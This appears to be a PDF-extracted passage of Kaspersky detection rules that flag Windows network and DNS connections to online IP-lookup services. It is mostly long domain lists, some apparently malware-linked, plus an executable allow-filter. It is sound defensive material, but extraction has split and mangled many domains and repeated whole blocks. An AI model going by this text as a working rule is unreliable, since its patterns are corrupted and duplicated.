'ipmonkey.com (http://\nipmonkey.com)'\n- 'bhv.v-speed.eu'\n- 'api.proxychecker.co (http://\napi.proxychecker.co)'\n- 'api.ip138.com (http://api.\nip138.com)'\n- 'anzan.by (http://anzan.by)'\n- 'lolbly.beget.tech'\n- 'api.wipmania.com (http://api.\nwipmania.com)'\n- 'ipservidor.com (http://\nipservidor.com)'\n- 'ipchicken.com (http://\nipchicken.com)'\n- 'ipinfo.io (http://ipinfo.io)'\n- '2018.ip138.com (http://2018.\nip138.com)'\n- 'kontrol.extrayazilim.com\n(http://kontrol.extrayazilim.com)'\n- 'advancedpccare.com\n(http://advancedpccare.com)'\n- 'infos.awardspace.co.uk\n(http://infos.awardspace.co.uk)'\n- 'api.kinomap.com (http://api.\nkinomap.com)'\n\n- 'ip.bablosoft.com (http://\nip.bablosoft.com)'\n- 'bseet.com (http://bseet.\ncom)'\n- 'ip.adro.co (http://ip.adro.co)'\n- 'ipip.net (http://ipip.net)'\n- 'mobi.kuwo.cn (http://mobi.\nkuwo.cn)'\n- 'who.is (http://who.is)'\n- 'pccleanerplus.com (http://\npccleanerplus.com)'\n- 'api.go2map.com (http://api.\ngo2map.com)'\n- '10037.myhost.su'\n- 'ip.trilockapps.com (http://\nip.trilockapps.com)'\n- 'knsemis.com (http://\nknsemis.com)'\n- 'playnt.myjino.ru (http://\nplaynt.myjino.ru)'\n- 'iredt.com (http://iredt.com)'\n- 'mobile.oneapm.com (http://\nmobile.oneapm.com)'\n- 'brutix1.info (http://brutix1.\n\n\ninfo)'\n- 'dlsft.com (http://dlsft.com)'\n- '02.283.co.kr (http://02.283.\nco.kr)'\n- 'qh4x88le5b.myjino.ru (http://\nqh4x88le5b.myjino.ru)'\n- 'iplocation.net (http://\niplocation.net)'\n- 'ip.biaoqingdou.com (http://\nip.biaoqingdou.com)'\n- 'dcfg.kgridhub.com (http://\ndcfg.kgridhub.com)'\n- 'myexternalip.com (http://\nmyexternalip.com)'\n- 'jangadi.info (http://jangadi.\ninfo)'\n- 'ipv4.wtfismyip.com (http://\nipv4.wtfismyip.com)'\n- 'latvdefrance.com (http://\nlatvdefrance.com)'\n- 'smart-ip.net (http://smart-ip.\nnet)'\n- 'ip.1tv.ru (http://ip.1tv.ru)'\n- 'ip.up66.ru (http://ip.up66.ru)'\n- 'myip.cx (http://myip.cx)'\n- 'apcsoftware.com.br (http://\napcsoftware.com.br)'\n- 'dynamic.zoneedit.com\n(http://dynamic.zoneedit.com)'\n- 'ipinfo.info (http://ipinfo.info)'\n- 'haimage-nocdn.cvgs.net\n(http://haimage-nocdn.cvgs.net)'\n- 'api.pantheracre.icu'\n- 'pcpowerboost.com (http://\npcpowerboost.com)'\n- 'download.formtec.co.kr\n(http://download.formtec.co.kr)'\n- 'mobileapi.netmarble.com\n(http://mobileapi.netmarble.com)'\n- 'ip.reachads.com (http://\nip.reachads.com)'\n- 'i-tax.in (http://i-tax.in)'\n- 'prob.mipropia.com (http://\nprob.mipropia.com)'\n- 'beta.speedtest.net (http://\nbeta.speedtest.net)'\n- 'ip-lookup.net (http://iplookup.net)'\n- 'clientn.autohideip.com\n(http://clientn.autohideip.com)'\n- 'api.ipify.org (http://api.ipify.\norg)'\n- 'geoip.fotoable.net (http://\ngeoip.fotoable.net)'\n- 'ins.itlantivirus.com (http://\nins.itlantivirus.com)'\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 3)\n\n- 'getwanip.com (http://\ngetwanip.com)'\n- 'networksecuritytoolkit.org\n(http://networksecuritytoolkit.org)'\n- 'dvrlists.com (http://dvrlists.\ncom)'\n- 'geoip.vmn.net (http://geoip.\nvmn.net)'\n- 'log.eclick.vn (http://log.eclick.\nvn)'\n- 'stat.funshion.net (http://stat.\nfunshion.net)'\n- 'imaslengviau.prg.lt (http://\nimaslengviau.prg.lt)'\n- 'lazygit.org (http://lazygit.\norg)'\n- 'client.superhideip.com\n(http://client.superhideip.com)'\n- 'ip2location'\n- 'api.2ip'\n- 'portchecktool'\n- 'canyouseeme'\n- 'ip-ping.ru (http://ip-ping.ru)'\n- 'check-host'\n- '2ip.ua (http://2ip.ua)'\n- 'whatismyip'\n- 'iptools'\n- 'portquiz'\n- '2ip.ru (http://2ip.ru)'\n- 'hidemy.name (http://hidemy.\nname)'\n\n\n- 'hostip'\n- 'iplookup'\n- 'meineip'\nfilter:\nImage|endswith:\n- 'msedge.exe'\n- 'betternet.exe'\n- 'xunfengcooperate.exe'\n- 'sidebar.exe'\n- 'stellarium.exe'\n- 'sogoucloud.exe'\n- 'virtualbox.exe'\n- 'reiboot.exe'\n- 'qbittorrent.exe'\n- 'eu4.exe'\n- 'mcafee safe connect.exe'\n- 'sohunews.exe'\n- 'fiddler.exe'\n- 'iwproxy.exe'\n- 'waterfox.exe'\n- 'maxthon.exe'\n- 'icedragon.exe'\n- 'sogouexplorer.exe'\n- 'seamonkey.exe'\n- 'ieuser.exe'\n- 'safari.exe'\n- 'browser.exe'\n- 'opera.exe'\n- 'amigo.exe'\n- 'chrome.exe'\n- 'firefox.exe'\n\n\n- 'iexplore.exe'\n- 'utorrent.exe'\n- 'pcapsvc2.exe'\n- 'testrunner.exe'\n- 'ksde.exe'\n- 'kpm.exe'\n- 'cntlm.exe'\n- 'klan.exe'\n- 'vmnat.exe'\n- 'proxifier.exe'\n- 'tradematictrader.exe'\n- 'sgnews.exe'\n- 'slack'\n- 'x-lite.exe'\n- 'qemu-system-i386.exe'\n- 'client_tos.exe'\n- 'nvnetworkservice.exe'\n- 'nvstreamsvc.exe'\n- '360se.exe'\n- 'rainmeter.exe'\n- 'microsoftedgecp.exe'\n- 'virtualboxvm.exe'\n- 'qqbrowser.exe'\n- 'vivaldi.exe'\ncondition: selection1 and not filter\nfalsepositives: Legitimate\napplications from \"Program Files\",\nspecific for organization\nlevel: high\n\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 22)\n\nid: c16f6f49-9e59-456f-aee3652fddce693e\ndescription: Detects network\nconnection to online IP resolution\nweb service\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Discovery\n- attack.T1016\nlogsource:\nproduct: windows\ndetection:\n\n\nselection1:\nCategory:\n- DNS Query\nQueryName|endswith:\n- 'pvcdesigner.com (http://\npvcdesigner.com)'\n- 'ip1.dynupdate.no-ip.com\n(http://ip1.dynupdate.no-ip.com)'\n- 'clientn.mask-myip.com\n(http://clientn.mask-myip.com)'\n- 'ipservice.suning.com (http://\nipservice.suning.com)'\n- 'madmax.utyuytjn.com\n(http://madmax.utyuytjn.com)'\n\n\n- 'whois.pconline.com.cn\n(http://whois.pconline.com.cn)'\n- 'myip.ch (http://myip.ch)'\n- 'ipv4.icanhazip.com (http://\nipv4.icanhazip.com)'\n- 'advancedpcspeedup.com\n(http://advancedpcspeedup.com)'\n- 'mypcupdate.com (http://\nmypcupdate.com)'\n- 'meuip.com (http://meuip.\ncom)'\n- 'export-it.org (http://exportit.org)'\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 22)\n\n- 'j923940.myjino.ru (http://\nj923940.myjino.ru)'\n- 'speechsvr.kuwo.cn (http://\nspeechsvr.kuwo.cn)'\n- 'api.ipinfodb.com (http://api.\nipinfodb.com)'\n- 'api.vtaoke.com (http://api.\nvtaoke.com)'\n- '3322.org (http://3322.org)'\n- 'showmyipaddress.com\n(http://showmyipaddress.com)'\n- 'curlmyip.net (http://curlmyip.\nnet)'\n- 'dyndns.org (http://dyndns.\norg)'\n- 'api.baizhu.cc (http://api.\nbaizhu.cc)'\n- 'mobilestock.etomato.com\n(http://mobilestock.etomato.com)'\n- 'lavageeks.ru (http://\nlavageeks.ru)'\n- 'lb3.pcvisit.de (http://lb3.\npcvisit.de)'\n- 'mfastkai.fastpay02.com\n(http://mfastkai.fastpay02.com)'\n- 'api.189.cn (http://api.189.cn)'\n- 'intorobot.com (http://\nintorobot.com)'\n- 'octarine.soxx.us (http://\noctarine.soxx.us)'\n- 'galaxyevol.ru (http://\ngalaxyevol.ru)'\n- 'meuip.operahouse.com.br\n(http://meuip.operahouse.com.br)'\n- 'ipaddresslocation.org\n(http://ipaddresslocation.org)'\n- 'myipaddress.com (http://\nmyipaddress.com)'\n- 'api.dns.corp.flamingo-inc.\ncom (http://api.dns.corp.flamingoinc.com)'\n- 'ip-addr.es (http://ip-addr.es)'\n- 'netikus.net (http://netikus.\nnet)'\n- 'evda-connector.appspot.\ncom (http://evda-connector.\nappspot.com)'\n- 'api.appota.com (http://api.\nappota.com)'\n- 'ipip.yy.com (http://ipip.\nyy.com)'\n- 'ip.gralindo.com (http://\nip.gralindo.com)'\n- 'api-center.coolook.org\n(http://api-center.coolook.org)'\n- 'fqrcw.com (http://fqrcw.\n\n\ncom)'\n- 'ip.bitauto.com (http://\nip.bitauto.com)'\n- 'pro.ip-api.com (http://pro.\nip-api.com)'\n- 'gserher.myjino.ru (http://\ngserher.myjino.ru)'\n- 'ad.solverlabs.com (http://\nad.solverlabs.com)'\n- 'ipapi.xyz'\n- 'meuip.eu'\n- 'ip.cip.cc (http://ip.cip.cc)'\n- 'accountcontabilidade.com.\nbr (http://accountcontabilidade.\ncom.br)'\n- 'eryaz.net (http://eryaz.net)'\n- 'myip.dnsomatic.com (http://\nmyip.dnsomatic.com)'\n- 'botanikyazilim.com.tr (http://\nbotanikyazilim.com.tr)'\n- 'j827328.myjino.ru (http://\nj827328.myjino.ru)'\n- 'cp.wjbox.ru (http://cp.wjbox.\nru)'\n- 'httpbin.org (http://httpbin.\norg)'\n- 'ip.6655.com (http://ip.6655.\ncom)'\n- 'cmyip.com (http://cmyip.\ncom)'\n- 'pixel.ijnewhb.com (http://\npixel.ijnewhb.com)'\n- 'find-ip-address.org (http://\nfind-ip-address.org)'\n- 'api.ipapi.com (http://api.\nipapi.com)'\n- 'box.hf-game.com (http://\nbox.hf-game.com)'\n- 'lavresearch.com (http://\nlavresearch.com)'\n- '7fw.de (http://7fw.de)'\n- 'ip-detect.net (http://ipdetect.net)'\n- 'cn.soeasysdk.com (http://\ncn.soeasysdk.com)'\n- 'own24.ru (http://own24.ru)'\n- 'ip.taobao.com (http://\nip.taobao.com)'\n- 'mg-control.com (http://mgcontrol.com)'\n- 'ff2008.com (http://ff2008.\ncom)'\n- 'efixpcutils.com (http://\nefixpcutils.com)'\n- 'ctc.bj.check.ie.sogou.com\n(http://ctc.bj.check.ie.sogou.com)'\n\n\n- 'ip2country.hackers.lv (http://\nip2country.hackers.lv)'\n- 'mycomputermechanics.com\n(http://mycomputermechanics.\ncom)'\n- 'wtfismyip.com (http://\nwtfismyip.com)'\n- 'ip.rtsd.ru (http://ip.rtsd.ru)'\n- 'fw.qq.com (http://fw.qq.\ncom)'\n- 'ddns.oray.com (http://ddns.\noray.com)'\n- 'api.raaga.com (http://api.\nraaga.com)'\n- 'meuip.net.br (http://meuip.\nnet.br)'\n- 'chekfast.zennolab.com\n(http://chekfast.zennolab.com)'\n- 'bluecorp.com.ar (http://\nbluecorp.com.ar)'\n- 'app.ajokki.fi (http://app.\najokki.fi)'\n- 'ppacti.com (http://ppacti.\ncom)'\n- 'm.manxwaplay.info (http://m.\nmanxwaplay.info)'\n- 'esecurepctools.com (http://\nesecurepctools.com)'\n- 'mam.netease.com (http://\nmam.netease.com)'\n- 'dtjrtj.duckdns.org (http://\ndtjrtj.duckdns.org)'\n- 'api.kidspots.ro (http://api.\nkidspots.ro)'\n- 'int.dpool.sina.com.cn (http://\nint.dpool.sina.com.cn)'\n- 'cc.entireactiv.com (http://\ncc.entireactiv.com)'\n- 'adtoppers.com (http://\nadtoppers.com)'\n- 'jeyhun.ru (http://jeyhun.ru)'\n- 'cyberfuzz.com (http://\ncyberfuzz.com)'\n- 'grandhero.tk (http://\ngrandhero.tk)'\n- 'idream94i.tk (http://\nidream94i.tk)'\n- 'baro-meter.co.kr (http://\nbaro-meter.co.kr)'\n- 'msalcedo.com (http://\nmsalcedo.com)'\n- 'apps.game.qq.com (http://\napps.game.qq.com)'\n- 'm-ceferli95.myjino.ru\n(http://m-ceferli95.myjino.ru)'\n- 'ip.42.pl (http://ip.42.pl)'\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 22)\n\n- 'pcpurifier.com (http://\npcpurifier.com)'\n- 'dofwq44044.dx.am (http://\ndofwq44044.dx.am)'\n- 'api.dten.com (http://api.\ndten.com)'\n- 'api.x2software.net (http://\napi.x2software.net)'\n- 'ms.efla.me'\n- 'prt.sleepnova.org (http://prt.\nsleepnova.org)'\n- 'whereisip.net (http://\nwhereisip.net)'\n- 'aws.pvp.monthurs.com\n(http://aws.pvp.monthurs.com)'\n- 'cargestion.com (http://\ncargestion.com)'\n- 'kirya272.myjino.ru (http://\nkirya272.myjino.ru)'\n- 'api.solvemedia.com (http://\napi.solvemedia.com)'\n- 'caocao69710-7.appspot.\ncom (http://caocao69710-7.\nappspot.com)'\n- 'minfosol.net (http://minfosol.\nnet)'\n- 'ipua.adfurikun.jp (http://ipua.\nadfurikun.jp)'\n- 'app.getsitecontrol.com\n(http://app.getsitecontrol.com)'\n- 'geoloc.arte.tv (http://geoloc.\narte.tv)'\n- 'm.manxwaplay.net (http://m.\nmanxwaplay.net)'\n- 'myip.ru (http://myip.ru)'\n- 'bemnacabine.com.br (http://\nbemnacabine.com.br)'\n- 'getip.com (http://getip.com)'\n- 'doodooalbum.co.kr (http://\ndoodooalbum.co.kr)'\n- 'geoip.goforandroid.com\n(http://geoip.goforandroid.com)'\n- 'lg.logging.admicro.vn (http://\nlg.logging.admicro.vn)'\n- 'ipv4.test-ipv6.com (http://\nipv4.test-ipv6.com)'\n- 'app.chinahighlights.com\n(http://app.chinahighlights.com)'\n- 'ip.anysrc.net (http://\nip.anysrc.net)'\n- 'en.safe-installation.com\n(http://en.safe-installation.com)'\n- 'myip.nl (http://myip.nl)'\n- 'ip.sap1000.com (http://\nip.sap1000.com)'\n- 'ifconfig.me'\n\n\n- 'geoiptool'\n- 'ercnetsis.com (http://\nercnetsis.com)'\n- 'maclo.myjino.ru (http://\nmaclo.myjino.ru)'\n- 'line.asure.com.tw (http://line.\nasure.com.tw)'\n- 'efixpctools.com (http://\nefixpctools.com)'\n- 'api.ipaddress.com (http://\napi.ipaddress.com)'\n- 'ip168.com (http://ip168.com)'\n- 'ns2.showmypc.com (http://\nns2.showmypc.com)'\n- 'pdapi.znyshurufa.com\n(http://pdapi.znyshurufa.com)'\n- 'matrixvoid.com (http://\nmatrixvoid.com)'\n- 'trfactiv.com (http://trfactiv.\ncom)'\n- 'ip.cn (http://ip.cn)'\n- 'pcpurifier.com (http://\npcpurifier.com)'\n- 'dofwq44044.dx.am (http://\ndofwq44044.dx.am)'\n- 'api.dten.com (http://api.\ndten.com)'\n- 'api.x2software.net (http://\napi.x2software.net)'\n- 'ms.efla.me'\n- 'prt.sleepnova.org (http://prt.\nsleepnova.org)'\n- 'whereisip.net (http://\nwhereisip.net)'\n- 'aws.pvp.monthurs.com\n(http://aws.pvp.monthurs.com)'\n- 'cargestion.com (http://\ncargestion.com)'\n- 'kirya272.myjino.ru (http://\nkirya272.myjino.ru)'\n- 'api.solvemedia.com (http://\napi.solvemedia.com)'\n- 'caocao69710-7.appspot.\ncom (http://caocao69710-7.\nappspot.com)'\n- 'minfosol.net (http://minfosol.\nnet)'\n- 'ipua.adfurikun.jp (http://ipua.\nadfurikun.jp)'\n- 'app.getsitecontrol.com\n(http://app.getsitecontrol.com)'\n- 'geoloc.arte.tv (http://geoloc.\narte.tv)'\n- 'm.manxwaplay.net (http://m.\nmanxwaplay.net)'\n- 'myip.ru (http://myip.ru)'\n\n\n- 'bemnacabine.com.br (http://\nbemnacabine.com.br)'\n- 'getip.com (http://getip.com)'\n- 'doodooalbum.co.kr (http://\ndoodooalbum.co.kr)'\n- 'geoip.goforandroid.com\n(http://geoip.goforandroid.com)'\n- 'lg.logging.admicro.vn (http://\nlg.logging.admicro.vn)'\n- 'ipv4.test-ipv6.com (http://\nipv4.test-ipv6.com)'\n- 'app.chinahighlights.com\n(http://app.chinahighlights.com)'\n- 'ip.anysrc.net (http://\nip.anysrc.net)'\n- 'en.safe-installation.com\n(http://en.safe-installation.com)'\n- 'myip.nl (http://myip.nl)'\n- 'ip.sap1000.com (http://\nip.sap1000.com)'\n- 'ifconfig.me'\n- 'geoiptool'\n- 'ercnetsis.com (http://\nercnetsis.com)'\n- 'maclo.myjino.ru (http://\nmaclo.myjino.ru)'\n- 'line.asure.com.tw (http://line.\nasure.com.tw)'\n- 'efixpctools.com (http://\nefixpctools.com)'\n- 'api.ipaddress.com (http://\napi.ipaddress.com)'\n- 'ip168.com (http://ip168.com)'\n- 'ns2.showmypc.com (http://\nns2.showmypc.com)'\n- 'pdapi.znyshurufa.com\n(http://pdapi.znyshurufa.com)'\n- 'matrixvoid.com (http://\nmatrixvoid.com)'\n- 'trfactiv.com (http://trfactiv.\ncom)'\n- 'ip.cn (http://ip.cn)'\n- 'geo.api.viewster.com (http://\ngeo.api.viewster.com)'\n- 'ip.larogames.cz (http://\nip.larogames.cz)'\n- 'atradepoint.com (http://\natradepoint.com)'\n- 'barmash.ru (http://barmash.\nru)'\n- 'api.test-ipv6.co (http://api.\ntest-ipv6.co)'\n- 'ip-score.com (http://ipscore.com)'\n- 'driverupdaterplus.com\n(http://driverupdaterplus.com)'\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 22)\n\n- 'checkip.dyndns.org (http://\ncheckip.dyndns.org)'\n- 'mini5-1.opera-mini.net\n(http://mini5-1.opera-mini.net)'\n- 'binnazabla.com (http://\nbinnazabla.com)'\n- 'ipneed.com (http://ipneed.\ncom)'\n- 'ip.dedikewl.fr (http://\nip.dedikewl.fr)'\n- 'apiv6.webprovider.cz (http://\napiv6.webprovider.cz)'\n- 'caocao69710-3.appspot.\ncom (http://caocao69710-3.\nappspot.com)'\n- 'blackghange.ru (http://\nblackghange.ru)'\n- 'api-ip.mtsgp.com (http://apiip.mtsgp.com)'\n- 'dawhois.com (http://\ndawhois.com)'\n- 'myav.co.uk (http://myav.\nco.uk)'\n- 'iptrackeronline.com (http://\niptrackeronline.com)'\n- 'disrup.me'\n- 'freegeoip.net (http://\nfreegeoip.net)'\n- 'flavionet.com (http://\nflavionet.com)'\n- 'clientn.free-hideip.com\n(http://clientn.free-hideip.com)'\n- 'power-equilab.com (http://\npower-equilab.com)'\n- 'checkip.amazonaws.com\n(http://checkip.amazonaws.com)'\n- 'dcs.coohua.com (http://dcs.\ncoohua.com)'\n- 'cc.globalpcworks.com\n(http://cc.globalpcworks.com)'\n- 'dipisoft.com (http://dipisoft.\ncom)'\n- 'check2.zennolab.com\n(http://check2.zennolab.com)'\n- 'cgi.nch.com.au (http://cgi.\nnch.com.au)'\n- 'ident.me'\n- 'ip.360.cn (http://ip.360.cn)'\n- 'list.adkuai8.com (http://list.\nadkuai8.com)'\n- 'domainserver.co.kr (http://\ndomainserver.co.kr)'\n- 'cp427.agava.net (http://\ncp427.agava.net)'\n- 'api.webprovider.cz (http://\napi.webprovider.cz)'\n\n\n- 'qqmyniga.cf (http://\nqqmyniga.cf)'\n- 'ipleak.net (http://ipleak.net)'\n- 'authaddr.ichano.com (http://\nauthaddr.ichano.com)'\n- 'alfactiv.com (http://alfactiv.\ncom)'\n- 'pimp-hhf.myjino.ru (http://\npimp-hhf.myjino.ru)'\n- 'lotusulalb2.ro (http://\nlotusulalb2.ro)'\n- 'miner.party'\n- 'app.jollychic.com (http://app.\njollychic.com)'\n- 'baby-gugu.com (http://\nbaby-gugu.com)'\n- 'ipfind.co (http://ipfind.co)'\n- 'mrgs.my.com (http://mrgs.\nmy.com)'\n- 'mubawab.ma (http://\nmubawab.ma)'\n- 'ipecho.net (http://ipecho.\nnet)'\n- 'fld.funshion.com (http://fld.\nfunshion.com)'\n- 'c.51fxt.com (http://c.51fxt.\ncom)'\n- 'codingforex.com (http://\ncodingforex.com)'\n- 'f0236061.xsph.ru (http://\nf0236061.xsph.ru)'\n- 'pv.sohu.com (http://pv.sohu.\ncom)'\n- 'cc.pcspeeduppro.net\n(http://cc.pcspeeduppro.net)'\n- '4secunde.automaticit.ro\n(http://4secunde.automaticit.ro)'\n- 'ru.smart-ip.net (http://\nru.smart-ip.net)'\n- 'arconsult.hu (http://\narconsult.hu)'\n- 'hididi.net (http://hididi.net)'\n- 'atsoft.it (http://atsoft.it)'\n- 'm.foultouch.com (http://m.\nfoultouch.com)'\n- 'ping1.mquadr.at (http://ping1.\nmquadr.at)'\n- 'browser.gwdang.com (http://\nbrowser.gwdang.com)'\n- 'kahuanwang.com (http://\nkahuanwang.com)'\n- 'q987356n.beget.tech'\n- 'prod.geo.gluops.com (http://\nprod.geo.gluops.com)'\n- 'ipdomainserver.kuwo.cn\n(http://ipdomainserver.kuwo.cn)'\n\n\n- 'iplocation.geo.qiyi.com\n(http://iplocation.geo.qiyi.com)'\n- 'cloud-search.linkury.com\n(http://cloud-search.linkury.com)'\n- 'formyip.com (http://formyip.\ncom)'\n- 'demositedsv.zzz.com.ua\n(http://demositedsv.zzz.com.ua)'\n- 'iwarg.ddns.net (http://iwarg.\nddns.net)'\n- 'mreg.kuwo.cn (http://mreg.\nkuwo.cn)'\n- 'm.easyrent.com.tw (http://m.\neasyrent.com.tw)'\n- 'gafernoto.tech'\n- 'g.go2s.co (http://g.go2s.co)'\n- 'country.reliancegames.com\n(http://country.reliancegames.com)'\n- 'cc.alfactiv.com (http://\ncc.alfactiv.com)'\n- 'emailarms.com (http://\nemailarms.com)'\n- 'alice.yourapp24.com (http://\nalice.yourapp24.com)'\n- 'gu.md (http://gu.md)'\n- 'api.ms.noswifi.cn (http://api.\nms.noswifi.cn)'\n- 'agentgatech.appspot.com\n(http://agentgatech.appspot.com)'\n- 'ipandlocation.appspot.com\n(http://ipandlocation.appspot.com)'\n- 'lokj.duckdns.org (http://lokj.\nduckdns.org)'\n- 'ana.gomtv.com (http://ana.\ngomtv.com)'\n- 'pcu.4bdir4.info (http://\npcu.4bdir4.info)'\n- 'c.speedtest.net (http://c.\nspeedtest.net)'\n- 'whoer.net (http://whoer.net)'\n- 'conf.ie.sogou.com (http://\nconf.ie.sogou.com)'\n- 'phelp.anyproxy.net (http://\nphelp.anyproxy.net)'\n- 'kxunion.com (http://kxunion.\ncom)'\n- 'ip.3322.net (http://ip.3322.\nnet)'\n- 'geobytes.com (http://\ngeobytes.com)'\n- 'failover.v-speed.eu'\n- 'globalsystools.com (http://\nglobalsystools.com)'\n- 'authorizationkey.pw (http://\nauthorizationkey.pw)'\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 22)\n\n- 'ipv4.myexternalip.com\n(http://ipv4.myexternalip.com)'\n- 'bizbuild.co.kr (http://bizbuild.\nco.kr)'\n- 'clientn.platinumhideip.com\n(http://clientn.platinumhideip.com)'\n- 'ip.pavietnam.vn (http://\nip.pavietnam.vn)'\n- 'chek.zennolab.com (http://\nchek.zennolab.com)'\n- 'l2.io (http://l2.io)'\n- 'ip-api.com (http://ip-api.\ncom)'\n- 'ms.fairplayminecraft.com\n(http://ms.fairplayminecraft.com)'\n- 'priv3.shieldapps.one'\n- 'api.ipstack.com (http://api.\nipstack.com)'\n- 'haliyikamaizmir.info (http://\nhaliyikamaizmir.info)'\n- 'ip.ip-check.net (http://ip.ipcheck.net)'\n- 'checkrealip.com (http://\ncheckrealip.com)'\n- 'checkip.dyndns.com (http://\ncheckip.dyndns.com)'\n- 'checkip.spdns.de (http://\ncheckip.spdns.de)'\n- 'autopromaker.com (http://\nautopromaker.com)'\n- 'iplocator.gofrugal.com\n(http://iplocator.gofrugal.com)'\n- 'noxcleaner.com (http://\nnoxcleaner.com)'\n- 'ae.gsecondscreen.com\n(http://ae.gsecondscreen.com)'\n- 'icanhazip.com (http://\nicanhazip.com)'\n- 'api.sypexgeo.net (http://api.\nsypexgeo.net)'\n- 'msct.kirara.st (http://msct.\nkirara.st)'\n- 'geoip.co.uk (http://geoip.\nco.uk)'\n- 'geoloc.hurriyet.com.tr\n(http://geoloc.hurriyet.com.tr)'\n- 'geoplugin.net (http://\ngeoplugin.net)'\n- 'geoip.anddoes.com (http://\ngeoip.anddoes.com)'\n- 'ipligence.com (http://\nipligence.com)'\n- 'ambianceapp.com (http://\nambianceapp.com)'\n- 'ianelolski.myjino.ru (http://\nianelolski.myjino.ru)'\n\n\n- 'myip.net (http://myip.net)'\n- 'aioli.kr (http://aioli.kr)'\n- 'propsoftware.co.uk (http://\npropsoftware.co.uk)'\n- 'infobyip.com (http://infobyip.\ncom)'\n- 'checkip.org (http://checkip.\norg)'\n- 'iplocate.firstsmile.mobi'\n- 'mrlsolutions.com (http://\nmrlsolutions.com)'\n- 'extreme-ip-lookup.com\n(http://extreme-ip-lookup.com)'\n- 'la.vietid.net (http://la.vietid.\nnet)'\n- 'meuip.ohs.com.br (http://\nmeuip.ohs.com.br)'\n- 'j680382.myjino.ru (http://\nj680382.myjino.ru)'\n- 'f0254974.xsph.ru (http://\nf0254974.xsph.ru)'\n- 'analiz.webraporlama.com\n(http://analiz.webraporlama.com)'\n- 'api.media.jio.com (http://api.\nmedia.jio.com)'\n- 'api.coolguang.com (http://\napi.coolguang.com)'\n- 'info.limehd.tv (http://info.\nlimehd.tv)'\n- 'ipgeobase.ru (http://\nipgeobase.ru)'\n- 'fast22.myjino.ru (http://\nfast22.myjino.ru)'\n- 'dynupdate.no-ip.com (http://\ndynupdate.no-ip.com)'\n- 'geoinfo.intowow.com (http://\ngeoinfo.intowow.com)'\n- 'iploc.eset.com (http://iploc.\neset.com)'\n- 'ipmonkey.com (http://\nipmonkey.com)'\n- 'bhv.v-speed.eu'\n- 'api.proxychecker.co (http://\napi.proxychecker.co)'\n- 'api.ip138.com (http://api.\nip138.com)'\n- 'anzan.by (http://anzan.by)'\n- 'lolbly.beget.tech'\n- 'api.wipmania.com (http://api.\nwipmania.com)'\n- 'ipservidor.com (http://\nipservidor.com)'\n- 'ipchicken.com (http://\nipchicken.com)'\n- 'ipinfo.io (http://ipinfo.io)'\n- '2018.ip138.com (http://2018.\n\n\nip138.com)'\n- 'kontrol.extrayazilim.com\n(http://kontrol.extrayazilim.com)'\n- 'advancedpccare.com\n(http://advancedpccare.com)'\n- 'infos.awardspace.co.uk\n(http://infos.awardspace.co.uk)'\n- 'api.kinomap.com (http://api.\nkinomap.com)'\n- 'ip.bablosoft.com (http://\nip.bablosoft.com)'\n- 'bseet.com (http://bseet.\ncom)'\n- 'ip.adro.co (http://ip.adro.co)'\n- 'ipip.net (http://ipip.net)'\n- 'mobi.kuwo.cn (http://mobi.\nkuwo.cn)'\n- 'who.is (http://who.is)'\n- 'pccleanerplus.com (http://\npccleanerplus.com)'\n- 'api.go2map.com (http://api.\ngo2map.com)'\n- '10037.myhost.su'\n- 'ip.trilockapps.com (http://\nip.trilockapps.com)'\n- 'knsemis.com (http://\nknsemis.com)'\n- 'playnt.myjino.ru (http://\nplaynt.myjino.ru)'\n- 'iredt.com (http://iredt.com)'\n- 'mobile.oneapm.com (http://\nmobile.oneapm.com)'\n- 'brutix1.info (http://brutix1.\ninfo)'\n- 'dlsft.com (http://dlsft.com)'\n- '02.283.co.kr (http://02.283.\nco.kr)'\n- 'qh4x88le5b.myjino.ru (http://\nqh4x88le5b.myjino.ru)'\n- 'iplocation.net (http://\niplocation.net)'\n- 'ip.biaoqingdou.com (http://\nip.biaoqingdou.com)'\n- 'dcfg.kgridhub.com (http://\ndcfg.kgridhub.com)'\n- 'myexternalip.com (http://\nmyexternalip.com)'\n- 'jangadi.info (http://jangadi.\ninfo)'\n- 'ipv4.wtfismyip.com (http://\nipv4.wtfismyip.com)'\n- 'latvdefrance.com (http://\nlatvdefrance.com)'\n- 'smart-ip.net (http://smart-ip.\nnet)'\n- 'ip.1tv.ru (http://ip.1tv.ru)'\n\n\n-----\n\ntitle: Generic-Network\nConnection to Online IP\nResolution Web Service\n(EventID 22)\n\n- 'ip.up66.ru (http://ip.up66.ru)'\n- 'myip.cx (http://myip.cx)'\n- 'apcsoftware.com.br (http://\napcsoftware.com.br)'\n- 'dynamic.zoneedit.com\n(http://dynamic.zoneedit.com)'\n- 'ipinfo.info (http://ipinfo.info)'\n- 'haimage-nocdn.cvgs.net\n(http://haimage-nocdn.cvgs.net)'\n- 'api.pantheracre.icu'\n- 'pcpowerboost.com (http://\npcpowerboost.com)'\n- 'download.formtec.co.kr\n(http://download.formtec.co.kr)'\n- 'mobileapi.netmarble.com\n(http://mobileapi.netmarble.com)'\n- 'ip.reachads.com (http://\nip.reachads.com)'\n- 'i-tax.in (http://i-tax.in)'\n- 'prob.mipropia.com (http://\nprob.mipropia.com)'\n- 'beta.speedtest.net (http://\nbeta.speedtest.net)'\n- 'ip-lookup.net (http://iplookup.net)'\n- 'clientn.autohideip.com\n(http://clientn.autohideip.com)'\n- 'api.ipify.org (http://api.ipify.\norg)'\n- 'geoip.fotoable.net (http://\ngeoip.fotoable.net)'\n- 'ins.itlantivirus.com (http://\nins.itlantivirus.com)'\n- 'getwanip.com (http://\ngetwanip.com)'\n- 'networksecuritytoolkit.org\n(http://networksecuritytoolkit.org)'\n- 'dvrlists.com (http://dvrlists.\ncom)'\n- 'geoip.vmn.net (http://geoip.\nvmn.net)'\n- 'log.eclick.vn (http://log.eclick.\nvn)'\n- 'stat.funshion.net (http://stat.\nfunshion.net)'\n- 'imaslengviau.prg.lt (http://\nimaslengviau.prg.lt)'\n- 'lazygit.org (http://lazygit.\norg)'\n- 